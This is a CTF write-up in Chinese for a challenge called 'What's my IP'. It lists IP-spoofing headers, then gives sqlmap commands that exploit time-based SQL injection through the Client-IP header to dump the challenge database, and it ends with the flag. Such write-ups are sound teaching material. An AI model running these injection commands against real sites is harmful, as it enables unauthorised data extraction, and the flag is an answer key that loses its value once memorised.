# What's my IP

- 點開題目網頁：
![image](https://github.com/jonafk555/My_CTF_Writeup/assets/75651364/065ae7b9-7647-4994-817d-476e48ae77d4)

可以觀察到這題後端邏輯大概是:
抓取你的請求IP --> 查詢該IP對應的Country code --> 顯示回頁面

- 第一步我們可以在Requset中加入一些能夠偽造請求IP的header，像是：
```
Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
Host: 127.0.0.1
Referer: www.google.com
```
之後可以發現`Client-IP: `能夠讓網頁吃進去解析。

- 了解偽造IP後，接下來想做的事這個header能夠發揮什麼用途，以下幾點思路：
  - http requset smuggling/splitting
  - SQL injection
  - ...
 
# 這題是在`Client-IP:`中做SQL injection：
- 首先利用sqlmap：`sqlmap -u "http://web.ctf.d3vc0r3.tw:8001/" --headers="Client-IP: 111.111.111.111*" --random-agent`
  - ![image](https://github.com/jonafk555/My_CTF_Writeup/assets/75651364/89662a66-a637-4bbf-9c60-2e8a8630b30d)
  - 可以發現此題是一個time-based的SQL injection
- 接下來嘗試dump更多資訊：`sqlmap -u "http://web.ctf.d3vc0r3.tw:8001/" --headers="Client-IP: 111.111.111.111*" --random-agent --dump --dbs`
  - ![image](https://github.com/jonafk555/My_CTF_Writeup/assets/75651364/9b275006-e254-4b8a-9338-4fadfa8c5404)
 
- 最後dump table name：`sqlmap -u "http://web.ctf.d3vc0r3.tw:8001/" --headers="Client-IP: 111.111.111.111*" --random-agent --dump -D flag_vBu6eL -table`
  - ![image](https://github.com/jonafk555/My_CTF_Writeup/assets/75651364/99c8f223-d183-4ac3-b2ad-900dc175a390)
  - `DEVCORE{01d_sch00l_1s_sti11_g00d}`
